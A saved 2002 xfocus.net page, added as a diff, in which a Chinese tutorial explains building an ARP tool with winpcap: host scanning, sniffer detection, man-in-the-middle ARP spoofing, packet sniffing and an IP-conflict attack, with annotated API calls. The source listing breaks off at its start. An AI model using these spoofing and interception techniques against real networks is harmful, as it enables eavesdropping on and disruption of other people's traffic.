@@ -1,0 +1,507 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0046)http://www.xfocus.net/articles/200209/447.html -->
+<HTML><HEAD><TITLE>详谈调用winpcap驱动写arp多功能工具</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<META 
+content="安全焦点, xfocus, 陷阱网络, honeynet, honeypot, 调查取证, forensic, 入侵检测, intrusion detection, 无线安全, wireless security, 安全论坛, security forums, 安全工具, security tools, 攻击程序, exploits, 安全公告, security advisories, 安全漏洞, security vulnerabilities, 安全教程, security tutorials, 安全培训, security training, 安全帮助, security help, 安全标准, security standards, 安全代码, security code, 安全资源, security resources, 安全编程, security programming, 加密, cryptography," 
+name=Keywords><LINK href="详谈调用winpcap驱动写arp多功能工具.files/plone.css" type=text/css 
+rel=stylesheet>
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
+<BODY text=#000000 bgColor=#ffffff>
+<DIV class=top>
+<DIV class=searchBox>
+<FORM name=searchform action=http://www.google.com/search method=get><INPUT 
+type=hidden value=www.xfocus.net name=domains> <INPUT type=hidden 
+value=www.xfocus.net name=sitesearch> <INPUT name=q> <INPUT type=submit value="Google Search" name=btnG> </FORM></DIV><IMG height=80 
+alt="xfocus logo" src="" width=180 border=0> <IMG height=20 alt="xfocus title" 
+src="" width=230 border=0> </DIV>
+<DIV class=tabs><A class=plain href="http://www.xfocus.net/index.html">首页</A> <A 
+class=plain href="http://www.xfocus.net/releases/index.html">焦点原创</A> <A 
+class=selected href="http://www.xfocus.net/articles/index.html">安全文摘</A> <A 
+class=plain href="http://www.xfocus.net/tools/index.html">安全工具</A> <A 
+class=plain href="http://www.xfocus.net/vuls/index.html">安全漏洞</A> <A class=plain 
+href="http://www.xfocus.net/projects/index.html">焦点项目</A> <A class=plain 
+href="https://www.xfocus.net/bbs/index.php?lang=cn">焦点论坛</A> <A class=plain 
+href="http://www.xfocus.net/about/index.html">关于我们</A> </DIV>
+<DIV class=personalBar><A 
+href="https://www.xfocus.net/php/add_article.php">添加文章</A> <A 
+href="http://www.xfocus.org/">English Version</A> </DIV>
+<TABLE class=columns>
+  <TBODY>
+  <TR>
+    <TD class=left>
+      <DIV class=box>
+      <H5>&nbsp;文章分类&nbsp;</H5>
+      <DIV class=body>
+      <DIV class="content odd">
+      <DIV style="WHITE-SPACE: nowrap"><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/4.html">专题文章</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/2.html">漏洞分析</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/3.html">安全配置</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/1.html">黑客教学</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/5.html"><B>编程技术 
+      &lt;&lt;</B></A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/7.html">工具介绍</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/6.html">火墙技术</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/8.html">入侵检测</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/9.html">破解专题</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/11.html">焦点公告</A><BR><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/folder_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/12.html">焦点峰会</A><BR></DIV></DIV></DIV></DIV>
+      <DIV class=box>
+      <H5>&nbsp;文章推荐&nbsp;</H5>
+      <DIV class=body>
+      <DIV class="content odd"><IMG 
+      src="详谈调用winpcap驱动写arp多功能工具.files/document_icon.gif" border=0> <A 
+      href="http://www.xfocus.net/articles/200307/579.html">LSD RPC 
+      溢出漏洞之分析</A><BR><IMG src="详谈调用winpcap驱动写arp多功能工具.files/document_icon.gif" 
+      border=0> <A 
+      href="http://www.xfocus.net/articles/200306/562.html">任意用户模式下执行 ring 0 
+      代码</A><BR><IMG src="详谈调用winpcap驱动写arp多功能工具.files/document_icon.gif" 
+      border=0> <A 
+      href="http://www.xfocus.net/articles/200307/563.html">IIS的NSIISLOG.DLL溢出问题分析</A><BR></DIV></DIV></DIV></TD>
+    <TD class=main>
+      <H1>详谈调用winpcap驱动写arp多功能工具</H1><BR>创建时间：2002-09-14<BR>文章属性：原创<BR>文章来源：中华安全网<BR>文章提交：<A 
+      href="https://www.xfocus.net/bbs/index.php?lang=cn&amp;act=Profile&amp;do=03&amp;MID=15823">TOo2y</A> 
+      (too2y_at_safechina.net)<BR><BR>详谈调用winpcap驱动写arp多功能工具<BR><BR>Author: 
+      TOo2y[原创]<BR>E-mail: TOo2y@safechina.net<BR>Homepage: <A 
+      href="http://www.safechina.net/" 
+      target=_blank>http://www.safechina.net/</A><BR>Date: 11-9-2002<BR><BR>一 
+      winpcap驱动简介<BR>二 Packet.dll相关数据结构及函数<BR>三 T-ARP功能及原理介绍<BR>四 
+      T-ARP主要代码分析<BR>五 
+      T-ARP源代码<BR><BR>一）winpcap驱动简介<BR>&nbsp;&nbsp;&nbsp;&nbsp;winpcap(windows 
+      packet 
+      capture)是windows平台下一个免费，公共的网络访问系统。开发winpcap这个项目的目的在于为win32应用程序提供访问网络底层的能力。它提供了以下的各项功能：<BR>&nbsp;&nbsp;&nbsp;&nbsp;1&gt; 
+      捕获原始数据报，包括在共享网络上各主机发送/接收的以及相互之间交换的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;2&gt; 
+      在数据报发往应用程序之前，按照自定义的规则将某些特殊的数据报过滤掉；<BR>&nbsp;&nbsp;&nbsp;&nbsp;3&gt; 
+      在网络上发送原始的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;4&gt; 
+      收集网络通信过程中的统计信息。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;winpcap的主要功能在于独立于主机协议（如TCP-IP)而发送和接收原始数据报。也就是说，winpcap不能阻塞，过滤或控制其他应用程序数据报的发收，它仅仅只是监听共享网络上传送的数据报。因此，它不能用于QoS调度程序或个人防火墙。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;目前，winpcap开发的主要对象是windows 
+      NT/2000/XP，这主要是因为在使用winpcap的用户中只有一小部分是仅使用windows 
+      95/98/Me，并且M$也已经放弃了对win9x的开发。因此本文相关的程序T-ARP也是面向NT/2000/XP用户的。其实winpcap中的面向9x系统的概念和NT系统的非常相似，只是在某些实现上有点差异，比如说9x只支持ANSI编码，而NT系统则提倡使用Unicode编码。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;本文讨论的是packet.dll所提供的各种函数，因为它们完全可以实现本文所希望的各项要求。但是如果你有其他特别的或更高级的要求，winpcap也提供了另一个动态连接库wpcap.dll。虽然wpcap.dll依靠于packet.dll,但是它却提供了一种更简单，直接，有力的方法来更好的利用编程环境。比如捕获一个数据报，创建一个数据报过滤装置或将监听到的数据报转存到某个文件等，wpcap.dll都会为你提供更加安全的实现方法。<BR><BR>二）Packet.dll相关数据结构及函数&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;本文的目的之一在于介绍如何利用winpcap驱动写ARP工具，因此有必要介绍一些相关的数据结构和函数，要不然看着一行行代码和函数，也许会有些不知所云。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;首先介绍一些相关的数据结构：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. 
+      typedef struct 
+      _ADAPTER&nbsp;&nbsp;ADAPTER&nbsp;&nbsp;//描述一个网络适配器；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. 
+      typedef struct _PACKET PACKET&nbsp;&nbsp;&nbsp;&nbsp; 
+      //描述一组网络数据报的结构；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3. typedef struct 
+      NetType 
+      NetType&nbsp;&nbsp;&nbsp;&nbsp;//描述网络类型的数据结构；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4. 
+      typedef struct npf_if_addr 
+      npf_if_addr&nbsp;&nbsp;//描述一个网络适配器的ip地址；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5. 
+      struct bpf_hdr&nbsp;&nbsp; 
+      //数据报头部；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6. struct 
+      bpf_stat&nbsp;&nbsp;//当前捕获数据报的统计信息。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;下面，将介绍T-ARP用到的各个函数，他们都是在packet.dll中定义的：<BR>&nbsp;&nbsp;&nbsp;&nbsp;1&gt;&nbsp;&nbsp;LPPACKET 
+      PacketAllocatePacket(void)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果运行成功，返回一个_PACKET结构的指针，否则返回NULL。成功返回的结果将会传送到PacketReceivePacket()函数，接收来自驱动的网络数据报。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;2&gt;&nbsp;&nbsp;VOID 
+      PacketCloseAdapter(LPADAPTER 
+      lpAdapter)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关闭参数中提供的网络适配器，释放相关的ADAPTER结构。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;3&gt;&nbsp;&nbsp;VOID 
+      PacketFreePacket(LPPACKET 
+      lpPacket)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放参数提供的_PACKET结构。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;4&gt;&nbsp;&nbsp;BOOLEAN 
+      PacketGetAdapterNames(LPSTR pStr,PULONG 
+      BufferSize)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;返回可以得到的网络适配器列表及描述。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;5&gt;&nbsp;&nbsp;BOOLEAN 
+      PacketGetNetInfoEx(LPTSTR AdapterNames,npf_ip_addr *buff, PLONG 
+      NEntries)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;返回某个网络适配器的全面地址信息。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中npf_ip_addr结构包含：IPAddress,SubnetMask,Broadcast<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPAddress: 
+      ip地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SubnetMask: 
+      子网掩码<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Broadcast: 
+      广播地址<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;6&gt;&nbsp;&nbsp;BOOLEAN 
+      PacketGetNetType(LPADAPTER AdapterObject, NetType 
+      *type)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;返回某个网络适配器的MAC类型。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NetType结构里包含了LinkSpeed(速度）和LinkType(类型）。其中LinkType包含以下几种情况：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMedium802_3: 
+      Ethernet(802.3)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMediumWan: 
+      WAN<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMedium802_5: 
+      Token 
+      Ring(802.5)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMediumFddi: 
+      FDDI<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMediumAtm: 
+      ATM<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdisMediumArcnet878_2: 
+      ARCNET(878.2)<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;7&gt;&nbsp;&nbsp;BOOLEAN 
+      PacketGetStats(LPADAPTER AdapterObject,struct bpf_stat 
+      *s)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;返回几个关于当前捕获报告的统计信息。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中bpf_stat结构包含：bs_recv, 
+      bs_drop,ps_ifdrop,bs_capt<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bs_recv: 
+      从网络适配器开始捕获数据报开始所接收到的所有数据报的数目，包括丢失的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bs_drop: 
+      丢失的数据报数目。在驱动缓冲区已经满时，就会发生数据报丢失的情况。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;8&gt;&nbsp;&nbsp;PCHAR 
+      PacketGetVersion()<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;返回关于dll的版本信息。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;9&gt;&nbsp;&nbsp;VOID 
+      PacketInitPacket(LPPACKET lpPacket, PVOID Buffer, UINT 
+      Length)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;初始化一个_PACKET结构。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;10&gt; 
+      LPADAPTER PacketOpetAdapter(LPTSTR 
+      AdapterName)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开一个网络适配器。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;11&gt; 
+      BOOLEAN PacketReceivePacket(LPADAPTER AdapterObject,LPPACKET 
+      lpPacket,BOOLEAN 
+      Sync)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从NPF驱动程序读取网络数据报及统计信息。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据报编码结构： 
+      |bpf_hdr|data|Padding|bpf_hdr|data|Padding|<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;12&gt; 
+      BOOLEAN PacketSendPacket(LPADAPTER AdapterObject,LPPACKET lpPacket, 
+      BOOLEAN 
+      Sync)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;发送一个或多个数据报的副本。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;13&gt; 
+      BOOLEAN PacketSetBuff(LPADAPTER AdapterObject,int 
+      dim)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置捕获数据报的内核级缓冲区大小。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;14&gt; 
+      BOOLEAN PacketSetHwFilter(LPADAPTER AdapterObject,ULONG 
+      Filter)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为接收到的数据报设置硬件过滤规则。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下为一些典型的过滤规则：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_PROMISCUOUS: 
+      设置为混杂模式，接收所有流过的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_DIRECTED: 
+      只有目的地为本地主机网络适配器的数据报才会被接收；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_BROADCAST: 
+      只有广播数据报才会被接收；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_MULTICAST: 
+      只有与本地主机网络适配器相对应的多播数据报才会被接收；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_ALL_MULTICAST: 
+      所有多播数据报均被接收；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NDIS_PACKET_TYPE_ALL_LOCAL: 
+      所有本地数据报均被接收。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;15&gt; BOOLEAN 
+      PacketSetNumWrites(LPADAPTER AdapterObject,int 
+      nwrites)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置调用PacketSendPacket()函数发送一个数据报副本所重复的次数。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;16&gt; 
+      BOOLEAN PacketSetReadTimeout(LPADAPTER AdapterObject,int 
+      timeout)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置在接收到一个数据报后“休息”的时间。<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;以上就是T-ARP所调用的各个函数，它包含了packet.dll里的大部分函数。如果你想更深层的了解winpcap,请访问相关网站，主页地址： 
+      <A href="http://winpcap.polito.it/" 
+      target=_blank>http://winpcap.polito.it/</A><BR><BR>三）T-ARP功能及原理介绍<BR>&nbsp;&nbsp;&nbsp;&nbsp;准备工作：&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. 
+      安装winpcap驱动，目前最新的版本为winpcap_3.0_alpha, 
+      稳定版本为winpcap_2.3；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. 
+      使用ARP欺骗功能前，必须启动ip路由功能，修改(添加)注册表选项：<BR>　　&nbsp;&nbsp;　　HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter 
+      = 
+      0x1　<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;选项:&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-m&nbsp;&nbsp;主机扫描，获得局域网内指定ip段中存活主机的ip地址和mac地址；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-a&nbsp;&nbsp;反嗅探扫描，获得局域网内指定ip段中嗅探主机的ip地址和mac地址；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-s&nbsp;&nbsp;ARP欺骗，欺骗局域网内指定的两台主机，使其相互发送接收的数据报均通过本地主机；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络嗅探，如果你选择欺骗的两台主机均是本地主机，那么将会监听到所有流过本地主机的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP冲突，如果你选择欺骗的两台主机是同一台非本地主机，那么就会发起ip冲突攻击；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-r&nbsp;&nbsp;重置被欺骗主机，使被欺骗的两台主机恢复正常的工作状态。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;原理及实现过程：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;无论什么选项，第一件事就是获得本地主机的mac地址及相关网络设置。我们以一个特殊的ip地址(112.112.112.112)向本地主机发送一个ARP 
+      Request(ARP请求)数据报，当本地主机接收到后，就会发送一个ARP 
+      Reply(ARP应答)数据报来回应请求，这样我们就可以获得本地主机的mac地址了。至于相关的网络设置可以通过PacketGetNetInfoEx()和PacketGetNetType()获得。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-m&nbsp;&nbsp;以本地主机的名义(本地主机的ip和mac)向指定ip网段内的所有主机发送广播(ff:ff:ff:ff:ff:ff)ARP 
+      Request数据报，存活的主机就会发送ARP Reply数据报，这样就可以获得当前存活主机的列表。因为在很多网关上都对ARP 
+      Request做了限制--非内网ip发送的ARP Request数据报不会得到网关的回应，如果你用内网的其他某台主机的ip来发送ARP 
+      Request数据报，如果填写的mac地址和相应的ip不合，就会出现ip冲突。所以最好还是用自己的ip和mac地址来发送请求。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-a&nbsp;&nbsp;以本地主机的名义(本地主机的ip和mac)向指定ip网段内的所有主机发送31位伪广播地址(ff:ff:ff:ff:ff:fe)的ARP 
+      Request数据报，只有正在嗅探的主机才会发送ARP 
+      Reply数据报，这样就可以获得当前存活主机的列表。嗅探中的win2000系统还会对16位伪广播地址(ff:ff:00:00:00:00)做出回应；而嗅探中的win95/98/me不仅会回应16位伪广播地址，而且也会回应8位伪广播地址(ff:00:00:00:00:00)，而*NIX系统对各种广播地址所做出的反应却有些不同。在此我们选择31位伪广播地址，是因为绝大多数的系统在嗅探时都会对它做出回应。而正常状况下的各种系统，都不会对31位伪广播地址做出回应。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-s 
+      (ARP欺骗spoof) 
+      需要强调的是在某些局域网(如以太网)内，数据报的发送与接收是基于硬件地址的，这是我们实现欺骗的基础。首先获得指定的两台主机(假设为 A 和 
+      B)的mac地址，然后向A发送ARP 
+      Reply数据报，其中的源ip地址为B的ip地址，但是源mac地址却是本地主机的mac地址，这样主机A就会认为主机B的mac地址是本地主机的mac地址，所以主机A发送到主机B的数据报都发送到本地主机了。同理向主机B发送ARP 
+      Reply数据报，通知它主机A的mac地址为本地主机的mac地址。这样主机A和主机B就会把目的主机的mac地址理解为本地主机的mac地址，于是他们之间相互发送的数据报都首先到达了本地主机，而先前我们已经将本地主机设置了ip路由功能，系统会自动将数据报转发到真正的目的主机。其间，你就可以监听它们通信的各种数据报了。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-s 
+      (网络嗅探sniff) 
+      如果指定的两个目的主机均为本地主机，那么就只是将网络适配器设置为混杂模式，这样就可以监听到流过本地主机网络适配器的各种数据。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-s 
+      (ip冲突shock） 如果你选择欺骗的两台主机是同一台非本地主机(假如是主机C)，那么就会不断地向主机C发送ARP 
+      Reply数据报，报文中的源ip地址就是主机C的ip地址，但是源mac地址却是本地主机的mac地址，因此主机C就会发现有另一台主机同时拥有和自己相同的ip，这就是ip冲突攻击。如果是非xp系统,都会跳出一个ip冲突的提示窗口，而xp系统也会有类似的警告。但是请注意，在主机C的系统事件查看器中，会留下本地主机的mac地址与之冲突的恶心记录，所以你最好不要滥用这个功能。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-r&nbsp;&nbsp;在实现了ARP欺骗的情况下，向主机A和B发送ARP 
+      Reply数据报，通知主机A(B)注意主机B(A)的mac地址为主机B(A)自己的mac地址，这样主机A和B就会更新他们的ARP缓存，实现正常的数据通信。<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>四）T-ARP主要代码分析<BR>&nbsp;&nbsp;&nbsp;&nbsp;1&gt; 
+      自定义函数：<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 
+      getmine()&nbsp;&nbsp;&nbsp;&nbsp;//发送ARP 
+      Request数据报，请求获得本地主机的mac地址；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;void 
+      getdata(LPPACKET lp,int 
+      op)&nbsp;&nbsp;//分类处理接收到的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD 
+      WINAPI sniff(LPVOID no)&nbsp;&nbsp;&nbsp;&nbsp; 
+      //将网络适配器设置为混杂模式，接收所有流过的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD 
+      WINAPI sendMASR(LPVOID no)&nbsp;&nbsp;//发送ARP 
+      Request数据报，请求获得指定ip的mac地址；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD 
+      WINAPI sendSR(LPVOID no)&nbsp;&nbsp;&nbsp;&nbsp;//发送ARP 
+      Reply进行ARP欺骗，或是更新主机的ARP缓存。<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;2&gt; 
+      主要代码分析<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nLibarary Version: 
+      %s",PacketGetVersion());&nbsp;&nbsp;//输出dll的版本信息；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketGetAdapterNames((char 
+      *)adaptername,&amp;adapterlength)&nbsp;&nbsp;//获得本地主机的网络适配器列表和描述；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpadapter=PacketOpenAdapter(adapterlist[open-1]);&nbsp;&nbsp;//打开指定的网络适配器；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketGetNetType(lpadapter,&amp;ntype)&nbsp;&nbsp;//获得网络适配器的MAC类型；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketGetNetInfoEx(adapterlist[open-1],&amp;ipbuff,&amp;npflen)&nbsp;&nbsp;//获得指定网络适配器的相关信息；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rthread=CreateThread(NULL,0,sniff,(LPVOID)&amp;opti,0,&amp;threadrid);&nbsp;&nbsp;//创建一个新线程来监听网络数据报；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketSetHwFilter(lpadapter,NDIS_PACKET_TYPE_PROMISCUOUS)&nbsp;&nbsp;//将网络适配器设置为混杂模式，这样才可以监听流过本地主机的数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketSetBuff(lpadapter,500*1024)&nbsp;&nbsp;//自定义网络适配器的内核缓的大小为 
+      500*1024；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketSetReadTimeout(lpadapter,1)&nbsp;&nbsp;//设置接收一个数据报后等待的时间为1毫秒；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketReceivePacket(lpadapter,lppacketr,TRUE)&nbsp;&nbsp;//在设置为混杂模式后，接收所有的数据报；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sthread=CreateThread(NULL,0,sendMASR,(LPVOID)&amp;opti,0,&amp;threadsid);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sthread=CreateThread(NULL,0,sendSR,(LPVOID)&amp;opti,0,&amp;threadsid);&nbsp;&nbsp;//创建一个新线程发送特定的ARP数据报<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketSetNumWrites(lpadapter,2)&nbsp;&nbsp;//在发送一个数据报时，重复发送两次；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketSendPacket(lpadapter,lppackets,TRUE)&nbsp;&nbsp;//发送自定义数据报；<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WaitForSingleObject(sthread,INFINITE);&nbsp;&nbsp;//等待发送ARP数据报的线程结束；<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketGetStats(lpadapter,&amp;stat)&nbsp;&nbsp;//获得网络适配器的统计信息；<BR><BR>五) 
+      T-ARP源代码<BR><BR>#include &lt;packet32.h&gt;<BR>#include 
+      &lt;ntddndis.h&gt;<BR>#include &lt;stdio.h&gt;<BR>#include 
+      &lt;conio.h&gt;<BR><BR>#pragma comment(lib,"ws2_32")<BR>#pragma 
+      comment(lib,"packet")<BR><BR>#define 
